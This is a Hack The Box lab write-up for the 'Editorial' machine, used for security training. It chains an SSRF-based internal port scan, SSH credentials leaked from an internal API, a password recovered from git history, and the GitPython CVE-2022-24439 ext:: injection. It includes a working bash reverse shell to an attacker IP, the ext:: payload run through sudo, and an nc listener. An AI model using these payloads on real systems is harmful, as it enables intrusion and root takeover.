# HTB: Editorial — Writeup

**OS:** Linux
**Difficulty:** Easy
**Techniques:** SSRF, internal API enumeration, git history secrets, GitPython CVE-2022-24439

---

## Synopsis

Editorial is an Easy Linux machine that features a publishing-house web app with a "Publish with us" form whose cover-image *preview* fetches an arbitrary URL server-side — a classic SSRF. Fuzzing internal ports through the SSRF reveals a Flask API bound to `127.0.0.1:5000`, and one of its endpoints — a welcome message for new authors — leaks SSH credentials for the `dev` user. In `dev`'s home a bare git repository holds the app's history; an old "downgrading prod to dev" commit still contains the `prod` user's production password. `prod` may run a `clone_prod_change.py` helper as root, which clones a user-supplied URL with GitPython 3.1.29. That version is vulnerable to CVE-2022-24439, an argument-injection flaw in `Repo.clone_from`, so an `ext::` transport URL executes a command as root and yields a root shell.

## Skills Required

- Basic web enumeration and virtual-host handling
- Understanding of SSRF and how to weaponise it for internal port scanning
- Comfort with `git` history inspection
- Reading a small Python script and matching a library version to a known CVE

## Skills Learned

- Turning an SSRF "preview" feature into an internal port scanner with `ffuf`
- Reading internal-only APIs through SSRF
- Recovering secrets deleted from current code but retained in git history
- Exploiting CVE-2022-24439 (GitPython `ext::` argument injection) via a sudo rule

---

## Enumeration

### Nmap

```
└──╼ [★]$ nmap -p- 10.129.102.69
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

└──╼ [★]$ nmap -p22,80 -sCV 10.129.102.69 -oA nmap/Editorial
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

Only SSH and HTTP are exposed. Port 80 redirects to the virtual host `editorial.htb`, which was added to `/etc/hosts`.

### HTTP (80)

The site is a publishing house. The interesting feature is the **"Publish with us"** page at `/upload`, which lets prospective authors submit a book. Alongside the file upload there is a **cover-image URL field with a Preview button**.

![Editorial 'Publish with us' upload form: cover-image URL field and Preview button that triggers the server-side fetch (SSRF)](images/editorial_publish-with-us-ssrf-form.png)

Pointing the URL field at a listener on the attacking box and hitting Preview produced a hit — the *server* fetches the URL, not the browser. That is a Server-Side Request Forgery (SSRF): the preview saves the fetched content to `static/uploads/<uuid>`, which can then be retrieved. This was confirmed end-to-end by serving a known file and reading it back:

```
# bookurl = http://10.10.15.60:8000/test.txt  →  returns static/uploads/<uuid>
└──╼ [★]$ curl http://editorial.htb/static/uploads/<uuid>
hello
```

---

## Foothold

### SSRF → internal port scan

Because the server fetches URLs for us, we can reach services bound to localhost that never appeared on the external scan. The upload request was saved from Burp and fed to `ffuf`, fuzzing the port inside `bookurl=http://127.0.0.1:FUZZ`. The dead-port responses were a constant size (61 bytes), so that size was filtered out:

```
└──╼ [★]$ ffuf -request editorial.req -request-proto http -w <(seq 0 65535) -fs 61

5000   [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 108ms]
```

An internal service is listening on `127.0.0.1:5000`.

### Reading the internal API

The bare root of the API returns nothing worth saving, but APIs advertise their routes under a prefix. Pointing the SSRF at `http://127.0.0.1:5000/api` and reading back the saved file returned a JSON listing of endpoints:

![Burp Repeater: SSRF via bookurl=http://127.0.0.1:5000/api returning the internal Flask API endpoint listing](images/editorial_burp-ssrf-port5000-api.png)

```json
{
  "messages": [
    {"promotions": {"endpoint": "/api/latest/metadata/messages/promos"}},
    {"coupons":    {"endpoint": "/api/latest/metadata/messages/coupons"}},
    {"new_authors":{"endpoint": "/api/latest/metadata/messages/authors"}},
    {"platform_use":{"endpoint": "/api/latest/metadata/messages/how_to_use_platform"}}
  ],
  ...
}
```

The `new_authors` endpoint — a *welcome message sent to new authors* — is the most likely place for onboarding credentials to leak. Fetching it through the SSRF returned exactly that:

```
"template_mail_message": "Welcome to the team! ... Your login credentials ...:
Username: dev
Password: dev080217_devAPI!@ ..."
```

### SSH as dev

The leaked credentials work over SSH:

```
└──╼ [★]$ ssh dev@editorial.htb
dev@editorial:~$ ls
apps  user.txt
```

`user.txt` retrieved.

---

## Lateral Movement

### Secret in git history (dev → prod)

`dev`'s home contains an `apps/` directory holding only a `.git` repository — the history of the editorial app. Deleted or changed secrets often survive in old commits, so the log is worth reading:

```
dev@editorial:~/apps/.git$ git log
...
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
    change(api): downgrading prod to dev
    * To use development environment.
...
```

The message "downgrading prod to dev" implies a production credential was swapped for a dev one. Viewing the commit shows the removed line still in the diff:

```
dev@editorial:~/apps/.git$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
...
-   ... Username: prod
-   Password: 080217_Producti0n_2023!@ ...
+   ... Username: dev
+   Password: dev080217_devAPI!@ ...
```

The `prod` password lets us pivot:

```
dev@editorial:~$ su prod
prod@editorial:~$ id
uid=1000(prod) ...
```

---

## Privilege Escalation

### CVE-2022-24439 — GitPython `ext::` argument injection

`prod` can run a helper script as root with any arguments:

```
prod@editorial:~$ sudo -l
User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

The script takes a URL argument and clones it with GitPython's `Repo.clone_from`. The installed version is vulnerable:

```
prod@editorial:~$ pip3 show GitPython
Name: GitPython
Version: 3.1.29
```

GitPython < 3.1.30 passes the clone target to `git` without sanitising it (**CVE-2022-24439**). Git's `ext::` transport lets a "remote" specify a command to run, so a crafted `ext::` URL runs arbitrary commands — and because the script runs as root via sudo, that command runs as root.

A reverse-shell one-liner was staged and the `ext::` payload used to execute it:

```
prod@editorial:~$ echo "bash -i >& /dev/tcp/10.10.15.60/1337 0>&1" > /tmp/shell.sh
prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /tmp/shell.sh'
```

(The spaces in the `ext::` command are written as `%` so git parses them as separate arguments. GitPython throws a traceback afterwards, but the command has already executed.) The listener caught a root shell:

```
└──╼ [★]$ nc -lvnp 1337
Connection received on 10.129.102.69 34706
root@editorial:/opt/internal_apps/clone_changes# id
uid=0(root) gid=0(root) groups=0(root)
```

`root.txt` retrieved.

---

## Summary of Techniques

| Stage | Technique |
|---|---|
| Enumeration | Nmap; vhost `editorial.htb`; discovered `/upload` preview feature |
| Foothold | SSRF via cover-image preview → `ffuf` internal port scan → read `127.0.0.1:5000` API → leaked `dev` SSH creds from authors welcome message |
| Lateral Movement | `dev` → `prod` via a production password left in git history ("downgrading prod to dev" commit) |
| PrivEsc | `prod` sudo rule runs GitPython 3.1.29 clone; CVE-2022-24439 `ext::` argument injection executes a root reverse shell |

---

## Lessons / Takeaways

- A "preview" or "fetch" feature that renders a remote URL is an SSRF until proven otherwise — and the highest-value use of SSRF is almost always turning it inward to reach localhost-only services.
- When fuzzing, baseline the "nothing here" response first; here the key port stood out only because its response size differed from the constant 61-byte miss.
- Removing a secret from the current code does nothing if the repository history still ships with the box. Always read `git log`/`git show`, not just the working tree.
- Match library versions to CVEs: a one-line `pip3 show` turned a vague "clone a URL" sudo rule into a precise, known root exploit. `ext::` is git's built-in command-execution transport and is worth remembering whenever user input reaches a clone.
